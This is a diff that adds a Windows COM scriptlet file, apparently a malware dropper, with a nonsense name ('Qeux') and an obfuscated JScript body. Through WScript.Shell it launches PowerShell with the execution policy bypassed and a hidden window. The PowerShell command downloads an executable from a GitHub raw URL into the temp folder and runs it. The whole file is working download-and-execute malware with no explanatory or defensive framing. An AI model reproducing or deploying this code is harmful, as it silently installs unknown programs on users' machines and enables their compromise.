@@ -1,0 +1,22 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Qeux"
+    progid="Qeux"
+    version="1.00"
+    classid="{00001111-0000-0000-0000-0000FEEDACDC}"
+	>
+	<script language="JScript">
+		<![CDATA[
+		
+            var LVG = new ActiveXObject("WScript.Shell");
+			var azFPe = "$down = New-Object System.Net.WebClient;$url = 'https://github.com/ASXckch/asdba55/raw/main/e_win.exe';$file = '%TMP%\\e_win.exe';$down.DownloadFile($url,$file);$exec = New-Object -com shell.application;$exec.shellexecute($file);exit;";
+			var JF = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -command ';
+			LVG.Exec(JF + azFPe);
+    
+		]]>
+</script>
+</registration>
+
+</scriptlet>
